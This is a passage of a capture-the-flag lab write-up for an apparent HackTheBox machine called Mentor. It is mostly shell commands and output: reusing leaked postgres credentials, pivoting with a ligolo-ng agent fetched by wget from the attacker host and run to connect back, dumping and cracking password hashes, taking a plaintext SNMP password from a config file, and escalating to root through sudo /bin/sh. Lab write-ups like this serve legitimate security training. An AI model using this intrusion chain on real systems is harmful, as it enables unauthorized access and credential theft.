engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)

```
we found postgres creds here
```
postgres
postgres
```
lets connect to postgres
```bash
psql -h 172.22.0.1 -p 5432 -U postgres
```
didnt work
```shell
/ # psql -h 172.22.0.1 -p 5432 -U postgres
sh: psql: not found
/ # 
```
so we need to pivot!

## Pivoting

### ligolo

on kali
```shell
sudo apt install ligolo-ng-common-binaries

┌──(ch3ckm8㉿kali)-[/usr/share/ligolo-ng-common-binaries]
└─$ ls                                                                                                                                      
ligolo-ng_agent_0.9.1_darwin_amd64  ligolo-ng_agent_0.9.1_windows_amd64.exe  ligolo-ng_proxy_0.9.1_linux_amd64
ligolo-ng_agent_0.9.1_darwin_arm64  ligolo-ng_agent_0.9.1_windows_arm64.exe  ligolo-ng_proxy_0.9.1_linux_arm64
ligolo-ng_agent_0.9.1_linux_amd64   ligolo-ng_proxy_0.9.1_darwin_amd64       ligolo-ng_proxy_0.9.1_windows_amd64.exe
ligolo-ng_agent_0.9.1_linux_arm64   ligolo-ng_proxy_0.9.1_darwin_arm64       ligolo-ng_proxy_0.9.1_windows_arm64.exe
```

start ligolo and pass the subnet that the container's ip is inside
```shell
sudo ./ligolo-ng_proxy_0.9.1_linux_amd64 -selfcert -laddr 0.0.0.0:3333
route_add --name ch3ckm8 --route 172.22.0.0/24
```
type `session`, then select session number, then
```shell
start --tun ch3ckm8
```

```shell
wget http://10.10.14.247:9001/ligolo-ng_agent_0.9.1_linux_amd64
chmod +x ligolo-ng_agent_0.9.1_linux_amd64
./ligolo-ng_agent_0.9.1_linux_amd64 -connect 10.10.14.247:3333 -ignore-cert -retry
```


now we can connect to postgres from our attacker host

lets verify first via nmap
```shell
└─$ nmap 172.22.0.1
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-22 12:16 -0400
Nmap scan report for 172.22.0.1
Host is up (0.48s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
81/tcp   open  hosts2-ns
5432/tcp open  postgresql
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 3.24 seconds
```
postgres is visible

```shell
└─$ psql -h 172.22.0.1 -p 5432 -U postgres
Password for user postgres: 
psql (18.3 (Debian 18.3-1+b1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# 

```
view all databases `\list`
```shell
                                                      List of databases
      Name       |  Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |   Access privileges   
-----------------+----------+----------+-----------------+------------+------------+--------+-----------+-----------------------
 mentorquotes_db | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 postgres        | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 template0       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/postgres          +
                 |          |          |                 |            |            |        |           | postgres=CTc/postgres
 template1       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/postgres          +
                 |          |          |                 |            |            |        |           | postgres=CTc/postgres

```
`mentorquotes_db` seems more interesting than the others
lets connect to it , view tables and print user related records from related table name
```shell
\connect mentorquotes_db
\dt
select * from users;
```

```shell
postgres=# \connect mentorquotes_db
psql (18.3 (Debian 18.3-1+b1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \dt
            List of tables
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)

mentorquotes_db=# 
```
great! we got hashes!
#### hashes obtained
```shell
james
7ccdcd8c05b59add9c198d492b36a503

service_acc
53f22d0dfa10dce7e29cd31f4f953fd8
```

## Cracking hashes
from those 2, `service_acc`'s was cracked via crackstation!
![](MediaFiles/Pasted%20image%2020260922192014.png)

#### creds obtained

```
service_acc
123meunomeeivani
```
lets try to ssh now with these creds

## Shell as svc

```shell
└─$ ssh svc@mentor.htb
svc@mentor.htb's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 22 04:21:45 PM UTC 2026

  System load:                      0.080078125
  Usage of /:                       65.2% of 8.09GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        243
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.72.226
  IPv6 address for eth0:            dead:beef::a0de:adff:fe73:b2d


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@mentor:~$ hostname
mentor
svc@mentor:~$ cat user.txt
27a7d06185e0bbf525179ec579247186
svc@mentor:~$ 

```

-----
# Privesc

## sudo -l

```shell
svc@mentor:~$ sudo -l
[sudo] password for svc: 
Sorry, user svc may not run sudo on mentor.
svc@mentor:~$ 
```

## Filesystem enumeration

```shell
svc@mentor:~$ ls /home
james  svc
svc@mentor:~$ 
svc@mentor:~$ cd /home/james
-bash: cd: /home/james: Permission denied

```

## Linpeas

linpeas showed `/etc/snmp/snmp.conf` lets go there
```shell
svc@mentor:/etc$ cd /etc/snmp
svc@mentor:/etc/snmp$ ls
snmp.conf  snmpd.conf  snmpd.conf.d
```

```shell
svc@mentor:/etc/snmp$ cat snmpd.conf
###########################################################################
#
# snmpd.conf
# An example configuration file for configuring the Net-SNMP agent ('snmpd')
# See snmpd.conf(5) man page for details
#
###########################################################################
# SECTION: System Information Setup
#

# syslocation: The [typically physical] location of the system.
#   Note that setting this value here means that when trying to
#   perform an snmp SET operation to the sysLocation.0 variable will make
#   the agent return the "notWritable" error code.  IE, including
#   this token in the snmpd.conf file will disable write access to
#   the variable.
#   arguments:  location_string
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>

# sysservices: The proper value for the sysServices object.
#   arguments:  sysservices_number
sysServices    72



###########################################################################
# SECTION: Agent Operating Mode
#
#   This section defines how the agent will operate when it
#   is running.

# master: Should the agent operate as a master agent or not.
#   Currently, the only supported master agent type for this t
#   is "agentx".
#   
#   arguments: (on|yes|agentx|all|off|no)

master  agentx

# agentaddress: The IP address and port number that the agent will listen on.
#   By default the agent listens to any and all traffic from any
#   interface on the default SNMP port (161).  This allows you to
#   specify which address, interface, transport type and port(s) that you
#   want the agent to listen on.  Multiple definitions of this token
#   are concatenated together (using ':'s).
#   arguments: [transport:]port[@interface/address],...

# agentaddress  127.0.0.1,[::1]
agentAddress udp:161,udp6:[::1]:161


###########################################################################
# SECTION: Access Control Setup
#
#   This section defines who is allowed to talk to your running
#   snmp agent.

# Views 
#   arguments viewname included [oid]

#  system + hrSystem groups only
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1


# rocommunity: a SNMPv1/SNMPv2c read-only access community name
#   arguments:  community [default|hostname|network/bits] [oid | -V view]

# Read-only access to everyone to the systemonly view
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly

# SNMPv3 doesn't use communities, but users with (optionally) an
# authentication and encryption string. This user needs to be created
# with what they can view with rouser/rwuser lines in this file.
#
# createUser username (MD5|SHA|SHA-512|SHA-384|SHA-256|SHA-224) authpassphrase [DES|AES] [privpassphrase]
# e.g.
# createuser authPrivUser SHA-512 myauthphrase AES myprivphrase
#
# This should be put into /var/lib/snmp/snmpd.conf 
#
# rouser: a SNMPv3 read-only access username
#    arguments: username [noauth|auth|priv [OID | -V VIEW [CONTEXT]]]
rouser authPrivUser authpriv -V systemonly

# include a all *.conf files in a directory
includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```
this contained plaintext creds1

#### creds obtained
```shell
SuperSecurePassword123__
```
lets try this for james

## Shell as james

```shell
└─$ ssh james@mentor.htb                                                                                                                      
james@mentor.htb's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 22 04:31:06 PM UTC 2026

  System load:                      0.0
  Usage of /:                       65.3% of 8.09GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        247
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.72.226
  IPv6 address for eth0:            dead:beef::a0de:adff:fe73:b2d


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


james@mentor:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:~$ hostname
mentor
james@mentor:~$ ls -la
total 20
drwxr-x--- 3 james james 4096 Nov 10  2022 .
drwxr-xr-x 4 root  root  4096 Jun 10  2022 ..
lrwxrwxrwx 1 root  root     9 Nov 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 james james 3771 Jun 10  2022 .bashrc
drwx------ 2 james james 4096 Jun 10  2022 .cache
-rw-r--r-- 1 james james  807 Jun 10  2022 .profile
james@mentor:~$ 
```
we are in!

### Sudo -l

```shell
james@mentor:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

#### Known binary
okay, thats a known binary, but wait we dont even need gtfobins for this, just execute it with sudo

## Shell as root
```shell
james@mentor:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
6578481fe321f7cdbaf26288d3043a9c
# hostname
mentor
# 
```